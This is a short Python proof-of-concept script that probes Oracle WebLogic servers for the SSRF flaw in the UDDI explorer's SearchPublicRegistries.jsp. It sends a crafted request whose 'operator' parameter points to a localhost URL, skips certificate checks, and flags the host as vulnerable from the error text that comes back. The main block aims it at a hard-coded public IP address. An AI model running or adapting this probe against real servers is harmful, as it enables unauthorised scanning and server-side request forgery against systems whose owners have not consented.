#!/usr/bin/env python
# _*_ coding:utf-8 _*_

import requests

headers = {'user-agent': 'ceshi/0.0.1'}


def poc(url):
    if '://' not in str(url):
        url = 'http://' + url
    payload = "/uddiexplorer/SearchPublicRegistries.jsp?operator=http://localhost/robots.txt&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search"
    url = url + payload
    req = requests.get(url, timeout=10, verify=False)
    if "weblogic.uddi.client.structures.exception.XML_SoapException" in req.text and "IO Exception on sendMessage" not in req.text:
        result = "目标存在 WebLogic ssrf : %s" % url
        return result


if __name__ == "__main__":
    a = poc('167.86.78.228:7001')
    print(a)
